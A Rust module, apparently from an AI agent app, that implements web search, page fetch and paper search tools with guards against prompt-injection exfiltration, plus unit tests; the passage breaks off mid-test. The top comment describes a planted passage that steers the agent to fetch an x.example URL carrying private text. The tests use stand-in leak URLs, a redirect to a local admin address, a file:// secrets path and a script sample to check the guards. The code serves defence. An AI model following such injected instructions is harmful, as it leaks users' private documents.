//! Web tools: `web_search`, `fetch_url` and `search_papers` (read tier).
//!
//! All three are refused while the app is in Local-only mode or web access
//! is turned off ([`WebEnv::blocked`]); the check runs on every call, so a
//! policy change applies to running sessions at once. Their results are
//! labelled untrusted ([`WEB_UNTRUSTED_NOTICE`]), numbered with the run's
//! citation numbers (recorded as web passages) and returned to the UI as
//! `webSources` so the transcript shows them apart from document citations.
//! Every call is audited with its query or URL (the tool-call arguments)
//! and the sources it returned (a `retrieval` event).
//!
//! What a call sends away can carry what the run has read: a planted
//! passage can ask for `fetch_url https://x.example/?q=<the passages>`. Once
//! the session has had private content (passages in any run, opened
//! document text, memories or history in a message, a message the app
//! composed: [`ToolContext::private_content`]), a page is fetched without
//! asking only when its URL is one of the run's web results or the user
//! wrote it
//! ([`fetch_needs_confirmation`]), and a search or paper query is sent
//! without asking only when it is the user's own words
//! ([`query_needs_confirmation`]); otherwise the user sees the full URL or
//! query and decides.
//!
//! Search results are ranked by relevance to the query before the model
//! sees them and weak matches are dropped
//! ([`crate::harness::web::relevance`]). The model is told to cite only
//! what it uses and to say nothing relevant was found rather than cite a
//! weak match.

use std::sync::Arc;

use async_trait::async_trait;
use serde_json::{json, Value};

use super::{
    req_str, ApprovalPreview, CitedPassage, HostTool, SessionGrant, ToolContext, ToolError,
    ToolOutput, WEB_UNTRUSTED_NOTICE,
};
use crate::harness::events::RiskTier;
use crate::harness::truncate_chars;
use crate::harness::web::client::{SafeClient, WebError};
use crate::harness::web::html::{decode_body, html_title, html_to_text};
use crate::harness::web::papers::search_papers;
use crate::harness::web::relevance::{RankMethod, SharedScorer};
use crate::harness::web::search::{rank_results, search, SearchConfig};

pub const WEB_SEARCH: &str = "web_search";
pub const FETCH_URL: &str = "fetch_url";
pub const SEARCH_PAPERS: &str = "search_papers";

/// Largest page read by `fetch_url`.
pub const MAX_PAGE_BYTES: u64 = 2 * 1024 * 1024;
const DEFAULT_PAGE_CHARS: usize = 12_000;
const MAX_PAGE_CHARS: usize = 20_000;
const DEFAULT_SEARCH_RESULTS: usize = 5;
const MAX_SEARCH_RESULTS: usize = 10;
const DEFAULT_PAPERS: usize = 8;
const MAX_PAPERS: usize = 20;

/// What the web tools need from the app.
#[async_trait]
pub trait WebEnv: Send + Sync {
    /// Why the agent may not use the web right now, if it may not.
    fn blocked(&self) -> Option<String>;
    /// The web search providers available now.
    async fn search_config(&self) -> SearchConfig;
    /// The local cross-encoder that ranks web and paper results by
    /// relevance, when its model is installed. Without it results are
    /// ranked by keyword overlap.
    async fn relevance_scorer(&self) -> Option<SharedScorer>;
}

fn web_error(error: WebError) -> ToolError {
    match error {
        WebError::Blocked { .. } | WebError::Credentials | WebError::UnsupportedScheme(_) => {
            ToolError::Forbidden(error.to_string())
        }
        WebError::InvalidUrl(_) => ToolError::InvalidArguments {
            tool: FETCH_URL.to_string(),
            reasons: error.to_string(),
        },
        other => ToolError::Unavailable(other.to_string()),
    }
}

fn check_allowed(env: &dyn WebEnv) -> Result<(), ToolError> {
    match env.blocked() {
        Some(reason) => Err(ToolError::Forbidden(reason)),
        None => Ok(()),
    }
}

/// `url` without surrounding whitespace or a trailing slash, for comparing.
fn url_key(url: &str) -> &str {
    url.trim().trim_end_matches('/')
}

/// Whether fetching `url` must be confirmed: once the session has had
/// private content (`private`), unless `url` is one of the run's web results
/// (`web_sources`) or appears in the user's own words.
pub fn fetch_needs_confirmation(
    url: &str,
    private: bool,
    web_sources: &[String],
    user_words: Option<&str>,
) -> bool {
    if !private {
        return false;
    }
    let wanted = url_key(url);
    if wanted.is_empty() {
        return true;
    }
    let known = web_sources.iter().any(|source| url_key(source) == wanted);
    let typed = user_words.is_some_and(|words| words.contains(wanted));
    !(known || typed)
}

/// Lowercase words separated by single spaces.
fn words_key(text: &str) -> String {
    text.split_whitespace()
        .collect::<Vec<_>>()
        .join(" ")
        .to_lowercase()
}

/// Whether sending the search `query` away must be confirmed: once the
/// session has had private content (`private`), unless the query is the
/// user's own words (in their message, ignoring case and spacing). A
/// rephrased query asks: telling a rephrasing apart from one that carries
/// passage text is not reliable.
pub fn query_needs_confirmation(query: &str, private: bool, user_words: Option<&str>) -> bool {
    if !private {
        return false;
    }
    let wanted = words_key(query);
    wanted.is_empty() || !user_words.is_some_and(|words| words_key(words).contains(&wanted))
}

/// `url`'s origin as the approval card names it: scheme, host and port
/// (`https://example.com:443`). `None` for anything but an http(s) URL with
/// a host.
pub fn url_origin(url: &str) -> Option<String> {
    let parsed = url::Url::parse(url.trim()).ok()?;
    if !matches!(parsed.scheme(), "http" | "https") {
        return None;
    }
    let host = parsed.host_str().filter(|h| !h.is_empty())?;
    let port = parsed.port_or_known_default()?;
    Some(format!("{}://{host}:{port}", parsed.scheme()))
}

/// The prompt of a web call that sends `what` (a URL or query) away.
fn send_preview(label: String, key: &str, what: &str) -> ApprovalPreview {
    ApprovalPreview {
        label: Some(label),
        details: json!({
            key: what,
            "why": "This answer has read your documents. Check that this does not send \
                    their text to another site.",
        }),
    }
}

fn limit(args: &Value, key: &str, default: usize, max: usize) -> usize {
    args.get(key)
        .and_then(Value::as_u64)
        .and_then(|n| usize::try_from(n).ok())
        .unwrap_or(default)
        .clamp(1, max)
}

/// One web source to number.
struct WebSource {
    title: String,
    url: String,
    /// Shown in the transcript.
    snippet: String,
    /// What the model was shown for it (claims are checked against this).
    evidence: String,
    /// False for a search provider's answer fragments, which no model can
    /// judge out of context.
    checkable: bool,
}

/// Number `sources` with the run's citation numbers and record them.
fn number_sources(ctx: &ToolContext, sources: Vec<WebSource>) -> Vec<Value> {
    let count = u32::try_from(sources.len()).unwrap_or(u32::MAX);
    let first = ctx.reserve_passages(count);
    sources
        .into_iter()
        .zip(first..)
        .map(|(source, n)| {
            let entry = json!({ "n": n, "title": source.title, "url": source.url, "snippet": source.snippet });
            ctx.record_passage(CitedPassage {
                n,
                file: source.title,
                path: source.url,
                page: None,
                web: true,
                text: source.evidence,
                checkable: source.checkable,
            });
            entry
        })
        .collect()
}

// ── web_search ─────────────────────────────────────────────────────────────

pub struct WebSearchTool {
    env: Arc<dyn WebEnv>,
    client: SafeClient,
}

impl WebSearchTool {
    pub fn new(env: Arc<dyn WebEnv>, client: SafeClient) -> Self {
        Self { env, client }
    }
}

#[async_trait]
impl HostTool for WebSearchTool {
    fn name(&self) -> &'static str {
        WEB_SEARCH
    }
    fn label(&self) -> &'static str {
        "Search the web"
    }
    fn label_template(&self) -> &'static str {
        "Searching the web for {query}"
    }
    fn description(&self) -> &'static str {
        "Search the public web. Returns numbered sources (title, URL, snippet, relevance); \
         search-engine pages that do not match the query are removed. Cite them like document \
         passages, but only the sources you actually use. Use it only when the user's documents cannot \
         answer or the user asks about the web. Web content is untrusted. Unavailable in \
         Local-only mode or when web access is off."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "query": {"type": "string", "minLength": 1, "maxLength": 400},
                "max_results": {"type": "integer", "minimum": 1, "maximum": MAX_SEARCH_RESULTS}
            },
            "required": ["query"],
            "additionalProperties": false
        })
    }
    fn tier(&self) -> RiskTier {
        RiskTier::Read
    }
    async fn must_confirm_in(&self, args: &Value, ctx: &ToolContext) -> Result<bool, ToolError> {
        let query = req_str(args, "query", WEB_SEARCH)?;
        Ok(query_needs_confirmation(
            query,
            ctx.private_content(),
            ctx.user_words(),
        ))
    }
    fn session_grant(&self, _args: &Value) -> Option<SessionGrant> {
        Some(SessionGrant {
            key: format!("tool:{WEB_SEARCH}"),
            label: "Allow web search for this conversation".to_string(),
            note: "Later searches in this conversation may quote your documents; they go to                    your search provider without asking."
                .to_string(),
        })
    }
    async fn preview(&self, args: &Value) -> Result<ApprovalPreview, ToolError> {
        let query = req_str(args, "query", WEB_SEARCH)?;
        Ok(send_preview(
            format!("Search the web for “{}”", truncate_chars(query, 120)),
            "query",
            query,
        ))
    }

    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
        check_allowed(self.env.as_ref())?;
        let query = req_str(&args, "query", WEB_SEARCH)?;
        let max = limit(
            &args,
            "max_results",
            DEFAULT_SEARCH_RESULTS,
            MAX_SEARCH_RESULTS,
        );
        let config = self.env.search_config().await;
        let (outcome, failures) = search(&self.client, &config, query, max)
            .await
            .map_err(|e| ToolError::Unavailable(e.to_string()))?;
        let scorer = self.env.relevance_scorer().await;
        let owned_query = query.to_string();
        let results = outcome.results.clone();
        let grounded = outcome.grounded;
        let (mut ranked, dropped, method) = match tokio::task::spawn_blocking(move || {
            rank_results(&owned_query, results, grounded, scorer.as_ref())
        })
        .await
        {
            Ok(ranked) => ranked,
            Err(e) => {
                tracing::warn!(target: "shodh::harness", error = %e, "web result ranking failed; keeping the provider's order");
                rank_results(query, outcome.results.clone(), grounded, None)
            }
        };
        ranked.truncate(max);
        if ranked.is_empty() {
            let text_for_model = if dropped > 0 {
                format!(
                    "{} returned {dropped} source(s) for \"{query}\", none relevant to it. Tell \
                     the user no relevant web sources were found; do not cite any.",
                    outcome.provider
                )
            } else {
                format!("{} found nothing for \"{query}\".", outcome.provider)
            };
            return Ok(ToolOutput {
                text_for_model,
                summary_for_ui: "No relevant web results".to_string(),
                detail: Some(json!({
                    "provider": outcome.provider,
                    "webSources": [],
                    "dropped": dropped,
                    "failures": failures,
                })),
            });
        }
        let sources: Vec<WebSource> = ranked
            .iter()
            .map(|(r, _)| WebSource {
                title: r.title.clone(),
                url: r.url.clone(),
                snippet: r.snippet.clone(),
                evidence: format!("{}. {}", r.title, r.snippet),
                checkable: !grounded,
            })
            .collect();
        let mut numbered = number_sources(ctx, sources);
        for (entry, (_, relevance)) in numbered.iter_mut().zip(&ranked) {
            if let Value::Object(map) = entry {
                map.insert("relevance".to_string(), json!(round2(*relevance)));
            }
        }
        let body = serde_json::to_string(&numbered)
            .map_err(|e| ToolError::Failed(format!("Could not encode results: {e}")))?;
        let mut text = format!(
            "{WEB_UNTRUSTED_NOTICE}\nWeb results from {}, {} (cite them by n):\n{body}",
            outcome.provider,
            relevance_note(method, dropped, "source")
        );
        if let Some(summary) = &outcome.summary {
            text.push_str(&format!(
                "\nThe search provider's own summary (untrusted, cite the sources above, not this):\n{summary}"
            ));
        }
        if !failures.is_empty() {
            text.push_str(&format!("\nNote: {}", failures.join("; ")));
        }
        let noun = if numbered.len() == 1 {
            "result"
        } else {
            "results"
        };
        Ok(ToolOutput {
            text_for_model: text,
            summary_for_ui: format!("{} web {noun} · {}", numbered.len(), outcome.provider),
            detail: Some(json!({
                "provider": outcome.provider,
                "query": query,
                "webSources": numbered,
                "attributionHtml": outcome.attribution_html,
                "dropped": dropped,
                "ranking": method.label(),
                "failures": failures,
            })),
        })
    }
}

/// "1 paper", "3 papers".
fn plural(n: usize, noun: &str) -> String {
    if n == 1 {
        format!("1 {noun}")
    } else {
        format!("{n} {noun}s")
    }
}

/// `x` rounded to two decimals, for the model.
fn round2(x: f32) -> f64 {
    (f64::from(x) * 100.0).round() / 100.0
}

/// How results were ranked and what the model may cite, for the tool
/// output.
fn relevance_note(method: RankMethod, dropped: usize, noun: &str) -> String {
    let ranked = match method {
        RankMethod::CrossEncoder => {
            "each with a relevance score from a local cross-encoder (0 to 1)"
        }
        RankMethod::Lexical => "each with a relevance score from keyword overlap (0 to 1)",
    };
    let cut = if dropped > 0 {
        format!("; weak matches removed: {}", plural(dropped, noun))
    } else {
        String::new()
    };
    format!(
        "{ranked}{cut}. Cite only the ones you actually use, for what they say; if none answers \
         the question, say so instead of citing a weak match"
    )
}

// ── fetch_url ──────────────────────────────────────────────────────────────

pub struct FetchUrlTool {
    env: Arc<dyn WebEnv>,
    client: SafeClient,
}

impl FetchUrlTool {
    pub fn new(env: Arc<dyn WebEnv>, client: SafeClient) -> Self {
        Self { env, client }
    }
}

/// Readable text and title of a fetched body, by content type.
fn page_text(bytes: &[u8], content_type: &str, url: &str) -> Result<(String, String), ToolError> {
    let mime = content_type
        .split(';')
        .next()
        .unwrap_or("")
        .trim()
        .to_ascii_lowercase();
    let fallback_title = || url.to_string();
    match mime.as_str() {
        "text/html" | "application/xhtml+xml" | "" => {
            let html = decode_body(bytes, Some(content_type));
            let title = html_title(&html).unwrap_or_else(fallback_title);
            Ok((title, html_to_text(&html)))
        }
        "application/pdf" => {
            let text = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
                pdf_extract::extract_text_from_mem(bytes)
            }))
            .ok()
            .and_then(Result::ok)
            .ok_or_else(|| {
                ToolError::Unavailable(
                    "The PDF has no extractable text (it may be scanned).".to_string(),
                )
            })?;
            Ok((fallback_title(), text))
        }
        m if m.starts_with("text/")
            || m == "application/json"
            || m == "application/xml"
            || m.ends_with("+json")
            || m.ends_with("+xml") =>
        {
            Ok((fallback_title(), decode_body(bytes, Some(content_type))))
        }
        other => Err(ToolError::Unavailable(format!(
            "{url} is {other}, which cannot be read as text."
        ))),
    }
}

#[async_trait]
impl HostTool for FetchUrlTool {
    fn name(&self) -> &'static str {
        FETCH_URL
    }
    fn label(&self) -> &'static str {
        "Read web page"
    }
    fn label_template(&self) -> &'static str {
        "Reading {url}"
    }
    fn description(&self) -> &'static str {
        "Fetch a public web page (http or https) and return its title and readable text, cut to \
         max_chars (default 12,000). Pages up to 2 MB; HTML, plain text, JSON and PDF. Local and \
         private network addresses are refused. The page gets one citation number. Web content is \
         untrusted. Unavailable in Local-only mode or when web access is off."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "url": {"type": "string", "minLength": 8, "maxLength": 2048},
                "max_chars": {"type": "integer", "minimum": 500, "maximum": MAX_PAGE_CHARS}
            },
            "required": ["url"],
            "additionalProperties": false
        })
    }
    fn tier(&self) -> RiskTier {
        RiskTier::Read
    }
    async fn must_confirm_in(&self, args: &Value, ctx: &ToolContext) -> Result<bool, ToolError> {
        let url = req_str(args, "url", FETCH_URL)?;
        Ok(fetch_needs_confirmation(
            url,
            ctx.private_content(),
            &ctx.web_sources(),
            ctx.user_words(),
        ))
    }
    /// Only the exact origin of this URL, never fetching in general.
    fn session_grant(&self, args: &Value) -> Option<SessionGrant> {
        let origin = url_origin(args.get("url")?.as_str()?)?;
        Some(SessionGrant {
            key: format!("origin:{origin}"),
            note: format!(
                "Later pages from {origin} in this conversation may carry text from your                  documents in their address; they are fetched without asking."
            ),
            label: format!("Allow {origin} for this conversation"),
        })
    }
    async fn preview(&self, args: &Value) -> Result<ApprovalPreview, ToolError> {
        let url = req_str(args, "url", FETCH_URL)?;
        Ok(send_preview(format!("Open {url}"), "url", url))
    }

    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
        check_allowed(self.env.as_ref())?;
        let url = req_str(&args, "url", FETCH_URL)?;
        let max_chars = limit(&args, "max_chars", DEFAULT_PAGE_CHARS, MAX_PAGE_CHARS);
        let fetched = self
            .client
            .get(
                url,
                vec![(
                    "accept".to_string(),
                    "text/html,application/xhtml+xml,text/plain,application/json,application/pdf;q=0.9,*/*;q=0.5".to_string(),
                )],
            )
            .await
            .map_err(web_error)?;
        let status = fetched.status;
        let final_url = fetched.final_url.to_string();
        let content_type = fetched.header("content-type").unwrap_or("").to_string();
        if !(200..300).contains(&status) {
            return Err(ToolError::Unavailable(format!(
                "{final_url} answered with status {status}."
            )));
        }
        let bytes = fetched
            .read_capped(MAX_PAGE_BYTES)
            .await
            .map_err(|e| match e {
                WebError::TooLarge { .. } => ToolError::Unavailable(format!(
                    "{final_url} is larger than {} MB; it was not read.",
                    MAX_PAGE_BYTES / (1024 * 1024)
                )),
                other => web_error(other),
            })?;
        let (title, text) = page_text(&bytes, &content_type, &final_url)?;
        let total = text.chars().count();
        if text.trim().is_empty() {
            return Err(ToolError::NotFound(format!(
                "{final_url} has no readable text."
            )));
        }
        let body = truncate_chars(&text, max_chars);
        let snippet = truncate_chars(&text, 300);
        let numbered = number_sources(
            ctx,
            vec![WebSource {
                title: title.clone(),
                url: final_url.clone(),
                snippet,
                evidence: body.clone(),
                checkable: true,
            }],
        );
        let n = numbered
            .first()
            .and_then(|v| v.get("n"))
            .cloned()
            .unwrap_or(Value::Null);
        let cut = if total > max_chars {
            format!("\n[cut at {max_chars} of {total} characters]")
        } else {
            String::new()
        };
        let redirected = if final_url != url {
            format!(" (redirected from {url})")
        } else {
            String::new()
        };
        Ok(ToolOutput {
            text_for_model: format!(
                "{WEB_UNTRUSTED_NOTICE}\nWeb page [{n}]: {title}\nURL: {final_url}{redirected}\n\n{body}{cut}"
            ),
            summary_for_ui: format!("Read “{}”", truncate_chars(&title, 80)),
            detail: Some(json!({
                "url": url,
                "finalUrl": final_url,
                "status": status,
                "contentType": content_type,
                "chars": total,
                "webSources": numbered,
            })),
        })
    }
}

// ── search_papers ──────────────────────────────────────────────────────────

pub struct SearchPapersTool {
    env: Arc<dyn WebEnv>,
    client: SafeClient,
}

impl SearchPapersTool {
    pub fn new(env: Arc<dyn WebEnv>, client: SafeClient) -> Self {
        Self { env, client }
    }
}

#[async_trait]
impl HostTool for SearchPapersTool {
    fn name(&self) -> &'static str {
        SEARCH_PAPERS
    }
    fn label(&self) -> &'static str {
        "Search papers"
    }
    fn label_template(&self) -> &'static str {
        "Searching papers for {query}"
    }
    fn description(&self) -> &'static str {
        "Search scholarly literature through the free arXiv, OpenAlex and Semantic Scholar APIs. \
         Pass a paper's exact title, or a few precise topic words. Returns numbered papers, most \
         relevant first with weak matches removed, each with title, authors, year, venue, an \
         abstract snippet, DOI, landing page, relevance and an open-access PDF link when one \
         exists (never paywalled copies). Cite only papers you actually use; if none is \
         relevant, say no relevant papers were found instead of citing a weak match. \
         Unavailable in Local-only mode or when web access is off."
    }
    fn schema(&self) -> Value {
        json!({
            "type": "object",
            "properties": {
                "query": {"type": "string", "minLength": 1, "maxLength": 300},
                "limit": {"type": "integer", "minimum": 1, "maximum": MAX_PAPERS}
            },
            "required": ["query"],
            "additionalProperties": false
        })
    }
    fn tier(&self) -> RiskTier {
        RiskTier::Read
    }
    async fn must_confirm_in(&self, args: &Value, ctx: &ToolContext) -> Result<bool, ToolError> {
        let query = req_str(args, "query", SEARCH_PAPERS)?;
        Ok(query_needs_confirmation(
            query,
            ctx.private_content(),
            ctx.user_words(),
        ))
    }
    fn session_grant(&self, _args: &Value) -> Option<SessionGrant> {
        Some(SessionGrant {
            key: format!("tool:{SEARCH_PAPERS}"),
            label: "Allow paper search for this conversation".to_string(),
            note: "Later paper searches in this conversation may quote your documents; they go                    to the paper search services without asking."
                .to_string(),
        })
    }
    async fn preview(&self, args: &Value) -> Result<ApprovalPreview, ToolError> {
        let query = req_str(args, "query", SEARCH_PAPERS)?;
        Ok(send_preview(
            format!("Search papers for “{}”", truncate_chars(query, 120)),
            "query",
            query,
        ))
    }

    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
        check_allowed(self.env.as_ref())?;
        let query = req_str(&args, "query", SEARCH_PAPERS)?;
        let max = limit(&args, "limit", DEFAULT_PAPERS, MAX_PAPERS);
        let scorer = self.env.relevance_scorer().await;
        let found = search_papers(&self.client, query, max, scorer)
            .await
            .map_err(|e| ToolError::Unavailable(e.to_string()))?;
        let note = if found.failures.is_empty() {
            String::new()
        } else {
            format!("\nNote: {}", found.failures.join("; "))
        };
        let papers = found.papers;
        if papers.is_empty() {
            // No citation numbers are reserved for papers that will not be
            // shown.
            let text_for_model = if found.dropped > 0 {
                format!(
                    "No relevant papers found for \"{query}\": the {} the APIs returned do not \
                     match it. Tell the user no relevant papers were found; do not cite any \
                     paper for this search.{note}",
                    plural(found.dropped, "paper")
                )
            } else {
                format!("No papers matched \"{query}\".{note}")
            };
            return Ok(ToolOutput {
                text_for_model,
                summary_for_ui: "No relevant papers found".to_string(),
                detail: Some(json!({
                    "query": query,
                    "papers": [],
                    "webSources": [],
                    "dropped": found.dropped,
                    "failures": found.failures,
                })),
            });
        }
        let sources: Vec<WebSource> = papers
            .iter()
            .map(|p| {
                let snippet = p.abstract_snippet.clone().unwrap_or_default();
                WebSource {
                    title: p.title.clone(),
                    url: p.link(),
                    evidence: format!("{}. {snippet}", p.title),
                    snippet,
                    checkable: true,
                }
            })
            .collect();
        let numbered = number_sources(ctx, sources);
        let listed: Vec<Value> = papers
            .iter()
            .zip(&numbered)
            .map(|(p, n)| {
                let mut entry = serde_json::to_value(p).unwrap_or(Value::Null);
                if let Value::Object(map) = &mut entry {
                    if let Some(num) = n.get("n") {
                        map.insert("n".to_string(), num.clone());
                    }
                    if let Some(r) = p.relevance {
                        map.insert("relevance".to_string(), json!(round2(r)));
                    }
                }
                entry
            })
            .collect();
        let body = serde_json::to_string(&listed)
            .map_err(|e| ToolError::Failed(format!("Could not encode papers: {e}")))?;
        let open = papers.iter().filter(|p| p.pdf_url.is_some()).count();
        Ok(ToolOutput {
            text_for_model: format!(
                "{WEB_UNTRUSTED_NOTICE}\nPapers, {} (cite them by n; titleMatch marks the paper \
                 the query names; pdfUrl is open access when present):\n{body}{note}",
                relevance_note(found.method, found.dropped, "paper")
            ),
            summary_for_ui: format!("{} papers, {open} with open PDFs", papers.len()),
            detail: Some(json!({
                "query": query,
                "papers": listed,
                "webSources": numbered,
                "dropped": found.dropped,
                "ranking": found.method.label(),
                "failures": found.failures,
            })),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::harness::web::client::testing::*;
    use crate::harness::web::search::{ApiKey, OPENROUTER_URL};
    use crate::harness::AgentEvent;
    use tokio::sync::mpsc;

    struct Env {
        blocked: Option<String>,
        config: SearchConfig,
    }

    #[async_trait]
    impl WebEnv for Env {
        fn blocked(&self) -> Option<String> {
            self.blocked.clone()
        }
        async fn search_config(&self) -> SearchConfig {
            self.config.clone()
        }
        async fn relevance_scorer(&self) -> Option<SharedScorer> {
            None
        }
    }

    fn env(blocked: Option<&str>) -> Arc<dyn WebEnv> {
        Arc::new(Env {
            blocked: blocked.map(str::to_string),
            config: SearchConfig {
                openrouter_key: ApiKey::new("sk-or-test"),
                ..SearchConfig::default()
            },
        })
    }

    fn ctx() -> (ToolContext, mpsc::UnboundedReceiver<AgentEvent>) {
        let (tx, rx) = mpsc::unbounded_channel();
        (ToolContext::new("run-1", "step-1", tx), rx)
    }

    fn web_client() -> SafeClient {
        client(
            FakeResolver::default()
                .with("openrouter.ai", &["104.18.2.115"])
                .with("example.com", &["93.184.216.34"]),
            FakeTransport::default()
                .route(
                    OPENROUTER_URL,
                    Canned::ok(
                        "application/json",
                        include_str!("../fixtures/openrouter-web-search.json"),
                    ),
                )
                .route(
                    "https://example.com/article",
                    Canned::ok(
                        "text/html; charset=utf-8",
                        "<html><head><title>An article</title></head><body><p>Body text here.</p><script>alert(1)</script></body></html>",
                    ),
                )
                .route("https://example.com/away", Canned::redirect("http://127.0.0.1/admin"))
                .route(
                    "https://example.com/huge",
                    Canned::ok("text/plain", vec![b'a'; (MAX_PAGE_BYTES + 1) as usize]),
                )
                .route("https://example.com/bin", Canned::ok("application/zip", vec![0u8; 10])),
        )
        .0
    }

    #[tokio::test]
    async fn web_tools_refuse_when_policy_blocks_the_web() {
        let reason = "Local-only mode is on";
        let (ctx, _rx) = ctx();
        for tool in [
            Box::new(WebSearchTool::new(env(Some(reason)), web_client())) as Box<dyn HostTool>,
            Box::new(FetchUrlTool::new(env(Some(reason)), web_client())),
            Box::new(SearchPapersTool::new(env(Some(reason)), web_client())),
        ] {
            let err = tool
                .execute(
                    json!({"query": "x", "url": "https://example.com/article"}),
                    &ctx,
                )
                .await
                .unwrap_err();
            assert_eq!(
                err,
                ToolError::Forbidden(reason.to_string()),
                "{}",
                tool.name()
            );
        }
    }

    #[tokio::test]
    async fn web_search_numbers_results_as_web_passages() {
        let (ctx, _rx) = ctx();
        ctx.reserve_passages(3);
        let out = WebSearchTool::new(env(None), web_client())
            .execute(json!({"query": "rust 2024 edition"}), &ctx)
            .await
            .unwrap();
        assert!(out.text_for_model.starts_with(WEB_UNTRUSTED_NOTICE));
        let detail = out.detail.unwrap();
        assert_eq!(detail["webSources"][0]["n"], 4, "numbers continue the run");
        assert_eq!(detail["webSources"].as_array().unwrap().len(), 2);
        let cited = ctx.cited_passage(4).unwrap();
        assert!(cited.web);
        assert_eq!(cited.path, "https://www.example.org/rust-2024-edition");
        assert_eq!(out.summary_for_ui, "2 web results · OpenRouter web search");
    }

    #[tokio::test]
    async fn fetch_url_returns_title_and_text_and_refuses_unsafe_targets() {
        let (ctx, _rx) = ctx();
        let tool = FetchUrlTool::new(env(None), web_client());
        let out = tool
            .execute(json!({"url": "https://example.com/article"}), &ctx)
            .await
            .unwrap();
        assert!(out.text_for_model.contains("Web page [1]: An article"));
        assert!(out.text_for_model.contains("Body text here."));
        assert!(!out.text_for_model.contains("alert(1)"));
        assert_eq!(ctx.cited_passage(1).unwrap().file, "An article");

        let redirect = tool
            .execute(json!({"url": "https://example.com/away"}), &ctx)
            .await
            .unwrap_err();
        assert!(matches!(redirect, ToolError::Forbidden(_)), "{redirect}");
        let huge = tool
            .execute(json!({"url": "https://example.com/huge"}), &ctx)
            .await
            .unwrap_err();
        assert!(huge.to_string().contains("larger than 2 MB"));
        let binary = tool
            .execute(json!({"url": "https://example.com/bin"}), &ctx)
            .await
            .unwrap_err();
        assert!(binary.to_string().contains("application/zip"));
        let scheme = tool
            .execute(json!({"url": "file:///c:/secrets.txt"}), &ctx)
            .await
            .unwrap_err();
        assert!(matches!(scheme, ToolError::Forbidden(_)));
    }

    const DIFFUSING_BLAME: &str = "Diffusing Blame: Task-Dependent Credit Assignment in \
                                   Biologically Plausible Dual-Stream Networks";

    /// A client answering the scholarly APIs for `query` from the recorded
    /// Diffusing Blame answers (arXiv and Semantic Scholar unreachable).
    fn papers_client(query: &str) -> SafeClient {
        use crate::harness::web::papers::paper_requests;
        let requests = paper_requests(query, 12).unwrap();
        let mut transport = FakeTransport::default().route(
            requests.openalex.as_str(),
            Canned::ok(
                "application/json",
                include_str!("../fixtures/papers/diffusing-blame/openalex.json"),
            ),
        );
        if let Some(url) = &requests.openalex_title {
            transport = transport.route(
                url.as_str(),
                Canned::ok(
                    "application/json",
                    include_str!("../fixtures/papers/diffusing-blame/openalex-title.json"),
                ),
            );
        }
        client(
            FakeResolver::default()
                .with("export.arxiv.org", &["128.84.21.199"])
                .with("api.openalex.org", &["104.20.10.20"])
                .with("api.semanticscholar.org", &["13.32.150.10"]),
            transport,
        )
        .0
    }

    #[tokio::test]
    async fn search_papers_lists_ranked_papers_with_a_relevance_note() {
        let (ctx, _rx) = ctx();
        let out = SearchPapersTool::new(env(None), papers_client(DIFFUSING_BLAME))
            .execute(json!({"query": DIFFUSING_BLAME}), &ctx)
            .await
            .unwrap();
        assert!(out
            .text_for_model
            .contains("weak matches removed: 11 papers"));
        assert!(out
            .text_for_model
            .contains("Cite only the ones you actually use"));
        let detail = out.detail.unwrap();
        let papers = detail["papers"].as_array().unwrap();
        assert_eq!(papers.len(), 1, "only the named paper survives: {papers:?}");
        assert_eq!(papers[0]["n"], 1);
        assert_eq!(papers[0]["titleMatch"], true);
        assert_eq!(detail["ranking"], "keyword overlap");
        assert!(ctx.cited_passage(1).unwrap().web);
    }

    #[tokio::test]
    async fn search_papers_reports_no_relevant_papers_without_reserving_citations() {
        let query = "copepod egg production";
        let (ctx, _rx) = ctx();
        let out = SearchPapersTool::new(env(None), papers_client(query))
            .execute(json!({"query": query}), &ctx)
            .await
            .unwrap();
        assert!(
            out.text_for_model
                .starts_with("No relevant papers found for \"copepod egg production\""),
            "{}",
            out.text_for_model
        );
        assert!(out.text_for_model.contains("do not cite any paper"));
        assert_eq!(out.summary_for_ui, "No relevant papers found");
        assert_eq!(ctx.reserve_passages(1), 1, "no citation numbers were used");
    }

    #[test]
    fn fetching_asks_once_passages_are_in_the_run_unless_the_url_is_known() {
        let results = vec!["https://example.com/article".to_string()];
        let user = Some("Summarise https://docs.example.org/guide/ for me");
        // Nothing read yet: nothing private to send.
        assert!(!fetch_needs_confirmation(
            "https://x.example/?q=a",
            false,
            &[],
            None
        ));
        // Passages read: an unknown URL asks, whatever it looks like.
        for url in [
            "https://x.example/?q=secret+passage",
            "https://x.example/c2VjcmV0",
            "https://example.com/article?leak=1",
            "https://docs.example.org/guide/../x?d=1",
        ] {
            assert!(fetch_needs_confirmation(url, true, &results, user), "{url}");
        }
        // One of the run's web results, or a URL the user wrote, does not.
        assert!(!fetch_needs_confirmation(
            "https://example.com/article/",
            true,
            &results,
            user
        ));
        assert!(!fetch_needs_confirmation(
            "https://docs.example.org/guide",
            true,
            &results,
            user
        ));
        assert!(fetch_needs_confirmation(" ", true, &results, user));
    }

    #[test]
    fn queries_ask_once_passages_are_in_the_run_unless_they_are_the_users_words() {
        let user = Some("What is SPANN   memory layout?");
        assert!(!query_needs_confirmation("anything at all", false, None));
        assert!(!query_needs_confirmation("spann memory", true, user));
        assert!(!query_needs_confirmation(
            "What is SPANN memory layout?",
            true,
            user
        ));
        assert!(query_needs_confirmation(
            "spann memory layout benchmarks",
            true,
            user
        ));
        assert!(query_needs_confirmation(
            "the confidential passage text",
            true,
            user
        ));
        assert!(query_needs_confirmation("spann", true, None));
    }

    #[tokio::test]
    async fn web_tools_ask_with_the_full_url_or_query_after_passages() {
        let (ctx, _rx) = ctx();
        let ctx = ctx.with_scope(Arc::new(crate::harness::tools::RunScope {
            own_words: Some("Read https://example.com/article please".to_string()),
            ..Default::default()
        }));
        let fetch = FetchUrlTool::new(env(None), web_client());
        let search = WebSearchTool::new(env(None), web_client());
        let papers = SearchPapersTool::new(env(None), web_client());
        let leak = json!({"url": "https://x.example/?q=private"});
        assert!(!fetch.must_confirm_in(&leak, &ctx).await.unwrap());
        assert!(!search
